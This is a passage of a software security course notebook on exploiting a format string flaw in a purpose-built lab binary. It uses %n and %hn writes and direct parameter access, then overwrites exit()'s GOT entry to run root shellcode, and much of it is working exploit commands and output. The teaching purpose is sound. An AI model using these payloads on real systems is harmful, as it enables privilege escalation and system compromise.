   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# next need to write 0xbb in 2nd byte\n",
    "print(0xbb - 0xaa)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# now write 0xbb in correct address\n",
    "# add %17x%n or -%16x%n\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08JUNK\\x1d\\xc0\\x04\\x08JUNK\\x1e\\xc0\\x04\\x08JUNK\\x1f\\xc0\\x04\\x08\")-%x-%x-%123x%n-%16x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(0xcc - 0xbb)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# now write 0xcc in correct address\n",
    "# add %17x%n or -16x\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08JUNK\\x1d\\xc0\\x04\\x08JUNK\\x1e\\xc0\\x04\\x08JUNK\\x1f\\xc0\\x04\\x08\")-%x-%x-%123x%n-%16x%n-%16x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# finally write 0xdd\n",
    "print(0xdd - 0xcc)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# now write 0xdd in correct address\n",
    "# add %17x%n or -%16x%n\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08JUNK\\x1d\\xc0\\x04\\x08JUNK\\x1e\\xc0\\x04\\x08JUNK\\x1f\\xc0\\x04\\x08\")-%x-%x-%123x%n-%16x%n-%16x%n-%16x%n\n",
    "# note JUNK can be anything"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Use Direct Parameter Access\n",
    "\n",
    "- we can use `%N$<format>` to directly access argument\n",
    "    - N is the position of argument starting at 1\n",
    "- simplified way to exploit format string vulnerability\n",
    "- allows parameters to be accessed directly by using argument order # (starting from 1) and the the dollar sign qualifier\n",
    "    - `%1$d` - access the $1^{st}$ parameter and display it as a decimal number\n",
    "    - `%2$x` - access the $2^{nd}$ parameter and display it as as a hexadecimal number\n",
    "- instead of sequentially accessing the first three parameters and using 4 bytes spacers of JUNK to increment the byte output count, we can use direct parameter access\n",
    "- let's write a more realistic-looking address of **0xbffffd72** into the variable test_val in fmt_vuln program\n",
    "- let's see how direct parameter access works using `demos/fmt_strings/fmt_directpara.cpp` program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/fmt_strings/vuln1\r\n"
     ]
    }
   ],
   "source": [
    "!pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 152\r\n",
      "drwxr-xr-x  3 kali kali  4096 Apr 25 15:16 .\r\n",
      "drwxr-xr-x 25 kali kali  4096 Apr 25 14:21 ..\r\n",
      "-rwxr-xr-x  1 kali kali   826 Apr 25 14:21 compile.sh\r\n",
      "-rw-r--r--  1 kali kali   121 May  3  2024 fmt_directpara.cpp\r\n",
      "-rw-r--r--  1 kali kali   762 May  3  2024 fmt_strings.cpp\r\n",
      "-rwxr-xr-x  1 root root 71952 Apr 25 14:21 fmt_strings.exe\r\n",
      "-rw-r--r--  1 kali kali   496 May  3  2024 fmt_uncommon2.cpp\r\n",
      "-rwxr-xr-x  1 root root 20604 Apr 25 15:16 fmt_uncommon2.exe\r\n",
      "-rw-r--r--  1 kali kali   499 May  3  2024 fmt_uncommon.cpp\r\n",
      "-rwxr-xr-x  1 root root 20600 Apr 25 14:21 fmt_uncommon.exe\r\n",
      "drwxr-xr-x  2 kali kali  4096 Apr 28 15:25 vuln1\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al ../"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "input=\"../fmt_directpara.cpp\"\n",
    "output=\"directpara.exe\"\n",
    "g++ -m32 -o $output $input"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./directpara.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# without direct access\n",
    "! ./fmt_vuln.exe AAAA%x%x%x%x\n",
    "# 4th parameter is where AAAA repeats; if not sure, try one at a time by adding %x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%4$x\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAA41414141\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffb910\r\n"
     ]
    }
   ],
   "source": [
    "# access the fourth argument (from beginning of the format string printf(...))\n",
    "# $ sign is special character for bash so must be escaped\n",
    "! ./fmt_vuln.exe AAAA%4\\$x\n",
    "# can try 1 at a time from 1...n until you see AAAA printed in hex"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAABBBBCCCCCDDDD%4$x%5$x\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAABBBBCCCCCDDDD4141414142424242\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffb900\r\n"
     ]
    }
   ],
   "source": [
    "# we can access the rest of the payload the same way...\n",
    "! ./fmt_vuln.exe AAAABBBB%4\\$x%5\\$x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# similarly, access 4 memory locations"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%4$s\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n"
     ]
    }
   ],
   "source": [
    "# use the same technique to write to the 4th argument as address\n",
    "! ./fmt_vuln.exe $(printf \"AAAA\")%4\\$s\n",
    "# get seg fault - because AAAA is not a valid address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# no segfault if 4th argument was a valid memory address\n",
    "# let's provide test_val's adddress\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\")%4\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# no need of JUNK; just use direct parameter access to write the rest in each memory byte\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\\x1d\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\\x1f\\xc0\\x04\\x08\")%4\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "98\n"
     ]
    }
   ],
   "source": [
    "# let's write our controlled address: 0xbffffd72 to test_val\n",
    "# let's do some math to get 0x72\n",
    "print(0x72-16)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# use the result as width to get 0x72 as least significant value for our controlled address: 0xbffffd72\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\\x1d\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\\x1f\\xc0\\x04\\x08\")%98x%4\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# do some math to print 0xfd of our controlled address: 0xbffffd72\n",
    "print(0xfd-0x72)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# use 139 as width to get 0xfd as next value\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\\x1d\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\\x1f\\xc0\\x04\\x08\")%98x%4\\$n%139x%5\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# do some math to print 0xff of our controlled address: 0xbffffd72\n",
    "print(0xff-0xfd)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# width of 2 doesn't work; shorter than (4 bytes or 8 characters hex) memory address!\n",
    "# add 1 in the front to make 0xff a bigger number to get larger than 8 width\n",
    "print(0x1ff-0xfd)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# use 2 as width to get 0xff as next value\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\\x1d\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\\x1f\\xc0\\x04\\x08\")%98x%4\\$n%139x%5\\$n%258x%6\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# do some math to print 0xbf of our controlled address: 0xbffffd72\n",
    "print(0xbf-0xff)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# negative width will not work!, make 0xbf larger by prepending 1\n",
    "print(0x1bf-0xff)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# use 2 as width to get 0xff as next value\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\\x1d\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\\x1f\\xc0\\x04\\x08\")%98x%4\\$n%139x%5\\$n%258x%6\\$n%192x%7\\$n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Using Short (2-byte) Writes\n",
    "- a `short` is typically a two-byte word using `h`\n",
    "- helps write an entire four-byte value with just two `%hn` parameters, instead of 4!\n",
    "- let's overwrite test_val variable with the address `0xbffffd72`\n",
    "\n",
    "| Address | Value |\n",
    "| --- | --- |\n",
    "| 0x0804c01c | 0xfd72 |\n",
    "|0x0804c01e | 0xbfff |"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# update least significant byte\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\")%x%x%x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# notice the test_val in hex: updates on both ends of the 4 bytes\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\")%x%x%x%hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# short write can be used with direct parameter access\n",
    "# update two least significant bytes\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\")%4\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# lets write 0xbffffd72 to test_val\n",
    "#  ./fmt_vuln.exe $(printf \"[first byte address][3rd byte address]\")%[w]x%4\\$hn%[w]x%5\\$hn\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\")%x%4\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 0xfd72 is written in first two (lower) bytes\n",
    "# Since 8 bytes of memory addresses will be written, subtract it from the goal\n",
    "\n",
    "print(0xfd72-8)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\")%64874x%4\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 0xbfff is written in last two (higher bytes)\n",
    "print(0xbfff-0xfd72)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# if smaller than previous width so, prepend 1\n",
    "print(0x1bfff-0xfd72)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# finally write 0xbffffd72 to test_val using 4th and 5th parameters\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\")%64874x%4\\$hn%49805x%5\\$hn"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Control the execution flow of the program\n",
    "- overwrite the return address in the most recent stack frame\n",
    "- stack-based overflow only allows overwriting return address\n",
    "- however, format string vulnerability provides the ability to overwrite any memory address the program can access\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Overwriting the Global Offset Table\n",
    "- See this [stackoverflow question to learn got and plt](https://stackoverflow.com/questions/43048932/why-does-the-plt-exist-in-addition-to-the-got-instead-of-just-using-the-got#:~:text=The%20PLT%20entry%20for%20a,first%20call%20(lazy%20binding).)\n",
    "- PLT (procedure linkage table) is used to store shared library\n",
    "- each time a shared function needs to be called, control will pass through the PLT\n",
    "- objdump program can be used to see `.plt` section\n",
    "- consists of many jump instructions each one corresponding to the address of a function\n",
    "    - run the cell below to see .plt section in fmt_vuln.exe program\n",
    "- `exit()` is called at the end of the program\n",
    "- if `exit()` function can be manipulated to direct the execution flow into shellcode, a root shell will be spawned\n",
    "- most of the functions are not jumping to addresses but to pointers to addresses\n",
    "    - e.g., exit() function's address is stored at `jump *[address]` (see below)\n",
    "- these addresses exist in another section, called the Global Offset Table (GOT) which is writable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "./fmt_vuln.exe:     file format elf32-i386\r\n",
      "\r\n",
      "\r\n",
      "Disassembly of section .plt:\r\n",
      "\r\n",
      "08049020 <__libc_start_main@plt-0x10>:\r\n",
      " 8049020:\tff 35 f8 bf 04 08    \tpush   0x804bff8\r\n",
      " 8049026:\tff 25 fc bf 04 08    \tjmp    *0x804bffc\r\n",
      " 804902c:\t00 00                \tadd    %al,(%eax)\r\n",
      "\t...\r\n",
      "\r\n",
      "08049030 <__libc_start_main@plt>:\r\n",
      " 8049030:\tff 25 00 c0 04 08    \tjmp    *0x804c000\r\n",
      " 8049036:\t68 00 00 00 00       \tpush   $0x0\r\n",
      " 804903b:\te9 e0 ff ff ff       \tjmp    8049020 <_init+0x20>\r\n",
      "\r\n",
      "08049040 <printf@plt>:\r\n",
      " 8049040:\tff 25 04 c0 04 08    \tjmp    *0x804c004\r\n",
      " 8049046:\t68 08 00 00 00       \tpush   $0x8\r\n",
      " 804904b:\te9 d0 ff ff ff       \tjmp    8049020 <_init+0x20>\r\n",
      "\r\n",
      "08049050 <strcpy@plt>:\r\n",
      " 8049050:\tff 25 08 c0 04 08    \tjmp    *0x804c008\r\n",
      " 8049056:\t68 10 00 00 00       \tpush   $0x10\r\n",
      " 804905b:\te9 c0 ff ff ff       \tjmp    8049020 <_init+0x20>\r\n",
      "\r\n",
      "08049060 <puts@plt>:\r\n",
      " 8049060:\tff 25 0c c0 04 08    \tjmp    *0x804c00c\r\n",
      " 8049066:\t68 18 00 00 00       \tpush   $0x18\r\n",
      " 804906b:\te9 b0 ff ff ff       \tjmp    8049020 <_init+0x20>\r\n",
      "\r\n",
      "08049070 <exit@plt>:\r\n",
      " 8049070:\tff 25 10 c0 04 08    \tjmp    *0x804c010\r\n",
      " 8049076:\t68 20 00 00 00       \tpush   $0x20\r\n",
      " 804907b:\te9 a0 ff ff ff       \tjmp    8049020 <_init+0x20>\r\n"
     ]
    }
   ],
   "source": [
    "! objdump -d -j .plt ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# see .got section header and if it says DATA -- means WRITEABLE.\n",
    "! objdump -h ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# display all dynamic relocations; short cut to see th pointers to the library functions\n",
    "! objdump -R ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- NOTE: exit()'s GOT entry OFFSET - which can be overwritten with the address of smuggled shellcode\n",
    "\n",
    "## Smuggle Shellcode & Exploit\n",
    "- create shellcode using gdb-peda - see [GDB-Peda.ipynb](./GDB-Peda.ipynb) Notebook for details\n",
    "    - use printf bash command to write 'shellcode as a binary file' > shellcode.bin\n",
    "    - or use shellcode_writer.py script to create binary shellcode\n",
    "- export shllcode as an env variable\n",
    "- find and write the address of shellcode into the address of the exit() function\n",
    "- when the program exits, it actually executes the shellcode in env variable\n",
    "\n",
    "### steps\n",
    "- stash the shellcode in env variable\n",
    "- find the address of the shellcode when the vulnerable program is loaded\n",
    "- find shared library function in GOT that's executed by the vulnerable program\n",
    "- by exploiting format string vulnerability, write the shellcode's address to the shared function's jump address\n",
    "- put it all together as a exploit code and launch it to exploit the vulnerable program\n",
    "\n",
    "### Advantage of using GOT\n",
    "- GOT entries are fixed per binary\n",
    "    - different system with the same binary will have the same GOT entry at the same address\n",
    "- ability to overwrite any arbitrary address opens up many possiblilites for exploitation\n",
    "- any section of writable memory that contains an address that directs the flow of program execution can be targeted\n",
    "- copy `shellcode_root.bin` file from `demos/shellcodes` folder"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/fmt_strings/vuln1\r\n"
     ]
    }
   ],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ../../shellcodes/shellcode_root.bin ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rw-r--r-- 1 kali kali 35 Apr 30 14:09 shellcode_root.bin\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al shellcode_root.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Use terminal to complete the following steps\n",
    "- create SHELLCODE env variable\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]\n",
    "└─$ export SHELLCODE=$(cat ./shellcode_root.bin)\n",
    "\n",
    "```\n",
    "- get the address of SHELLCODE env variable when ./fmt_vuln.exe program is executing\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]\n",
    "└─$ ./getenvaddr.exe SHELLCODE ./fmt_vuln.exe   \n",
    "SHELLCODE will be at 0xffffcc0b with reference to ./fmt_vuln.exe\n",
    "\n",
    "```\n",
    "\n",
    "- now that we know the address of shellcode, let's find out how we can write this address\n",
    "\n",
    "### Create exploit code and test it to make sure you're writing the correct address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# try 1, 2, 3, 4, etc, until you see hex A's printed\n",
    "# we know, 4th parameter starts printing AAAA for fmt_vuln.exe\n",
    "! ./fmt_vuln.exe $(printf \"AAAA\")%4\\$x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's write the SHELLCODE address to test_val to make sure we can do it\n",
    "# we can do the calculations to write to exit function's location in GOT\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\")%4\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# find the first width; # SHELLCODE will be at 0xffffcc0b\n",
    "# 8 bytes of addresses will be printed\n",
    "print(0xcc0b-8)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# find the 2nd width; # SHELLCODE will be at 0xffffcc0b\n",
    "print(0xffff-0xcc0b)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's write SHELLCODE's address to test_val for quick testing\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\")%52227x%4\\$hn%13300x%5\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# find the exit function's address in GOT and write SHELLCODE address to it\n",
    "! objdump -R ./fmt_vuln.exe | grep exit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# find the location of 2nd two bytes of exit function\n",
    "print(hex(0x10+2))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Simply replace test_val's address with exit() address in the same order\n",
    "! ./fmt_vuln.exe $(printf \"\\x10\\xc0\\x04\\x08\\x12\\xc0\\x04\\x08\")%52227x%4\\$hn%13300x%5\\$hn"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Finally, run the crafted command from a Terminal\n",
    "- the vulnerable program should execute the stashed shellcode\n",
    "- you should see a root prompt that you can interact with\n",
    "\n",
    "```bash\n",
    "...\n",
    "...\n",
    "\n",
    "[*] test_val @ 0x0804c028 = -72 0xffffffb8\n",
    "[*] text is @ 0xffffbed0\n",
    "# whoami\n",
    "root\n",
    "# cls\n",
    "/bin//sh: 2: cls: not found\n",
    "# clear\n",
    "TERM environment variable not set.\n",
    "# ls\n",
    "Makefile  directpara.exe  fmt_vuln.cpp  fmt_vuln.exe  fmt_vuln.o  getenvaddr.cpp  getenvaddr.exe  shellcode_root.bin\n",
    "# \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Smuggle shellcode into the text buffer\n",
    "- instead of stashing the Shellcode in environment variable, send it to the program and make the program execute it by overwriting the exit() function in GOT\n",
    "\n",
    "### Steps\n",
    "1. create a string in this format: `| NOP Sled | Shellcode |`\n",
    "2. Find the address of text buffer\n",
    "3. Find the address of `exit( )`\n",
    "4. Overwrite the address of exit with the address of text buffer\n",
    "    - exploit format string vulnerability to overwrite any address with your controlled address where the shellcode is stashed"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# find the size of exploit code\n",
    "! wc -c ./shellcode_root.bin\n",
    "# shellcode is 24 bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# create a string that's multiple of 4; not necessary\n",
    "# let's create a string of 100 bytes long 25*4\n",
    "# find length of NOP sleds to make 100 bytes long exploit code including shellcode\n",
    "25*4-35"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# text buffer is 1024 bytes big\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*65)' > exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! wc -c ./exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! hexdump -C exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let'S append Shellcode to the exploit code after the NOP sled\n",
    "! cat shellcode_root.bin >> exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! wc -c exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! hexdump -C exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Find the address of `text` buffer \n",
    "- typically found using gdb\n",
    "- can't easily find the actual address of text buffer\n",
    "- it shifts as we run the program with some arguments (size of the arguments matter), environment variables, program name, etc.\n",
    "- see [Buffer Overflow Basics](./BufferOverflowBasics.ipynb) chapter for details\n",
    "- we get different value outside the gdb\n",
    "- there are workarounds but little tidious...\n",
    "- for shake of learning and easiness, the address of text is printed!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./fmt_vuln.exe $(python -c 'print(\"A\"*50)')\n",
    "# notebook gives different address than the terminal; try it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./fmt_vuln.exe $(python -c 'print(\"A\"*200)')\n",
    "# text is at different address as the argument is longer"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Do the following directly on a Terminal\n",
    "- address of text buffer changes depending on where and how the program is run (with various length of argument) as shown above\n",
    "\n",
    "- find the right parameter number that starts repeating the AAAA in hex (41414141)\n",
    "     - try 1 2 ... n\n",
    "\n",
    "- after trial and error 29th argument prints 41414141 (AAAA) again\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]\n",
    "└─$ ./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf \"AAAABBBB\")%29\\$x\n",
    "The right way to print user-controlled input:\n",
    "�����������������������������������������������������������������1�1�1ə��j\n",
    "                                                                          XQh//shh/bin��Q��S��AAAABBBB%29$x\n",
    "\n",
    "The wrong way to print user-controlled input:\n",
    "�����������������������������������������������������������������1�1�1ə��j\n",
    "                                                                          XQh//shh/bin��Q��S��AAAABBBB41414141\n",
    "\n",
    "[*] test_val @ 0x0804c01c = -72 0xffffffb8\n",
    "[*] text is @ 0xffffb5c0\n",
    "\n",
    "```\n",
    "\n",
    "- let's use test_val's address to write controlled address for testing\n",
    "- now notice the address of text (`0xffffffb8`)\n",
    "    - NOTE - this may shift again as we build the final string\n",
    "    \n",
    "- subtract 100+8 from least two bytes\n",
    "    - we need to print shellcode with nop sled of size 100 (see above)\n",
    "    - we need to write 2 4-byte addresses (8 bytes) to access and write to that location using %hn\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's calculate the address of text ...\n",
    "! printf \"%d\" $((0xffb8-100-8))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! printf \"%d\" $((0xffff-0xffb8))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- let's check if the address of buffer was calculated correctly by writing to test_val\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]\n",
    "└─$ ./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf \"\\x1c\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\")%65356x%29\\$hn%71x%30\\$hn\n",
    "\n",
    "....\n",
    "[*] test_val @ 0x0804c01c = -72 0xffffffb8 <---- address we wanted to write\n",
    "[*] text is @ 0xffffb5b0 <---- address has changed however....!!!!!\n",
    "```\n",
    "\n",
    "### Readjust the width ...\n",
    "- the text buffer's address has changed...\n",
    "- recreate the exploit code and launch with the new addresses\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(0xb5b0-100-8)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "0xffff-0xb5b0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- let's run the exploit code with the new widths and write the address to test_val\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]\n",
    "└─$ ./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf \"\\x1c\\xc0\\x04\\x08\\x1e\\xc0\\x04\\x08\")%46404x%29\\$hn%19023x%30\\$hn\n",
    "\n",
    "...\n",
    "\n",
    "[*] test_val @ 0x0804c01c = -19024 0xffffb5b0 <---- address we wanted to write\n",
    "[*] text is @ 0xffffb5b0 <--- address of text is still the same\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
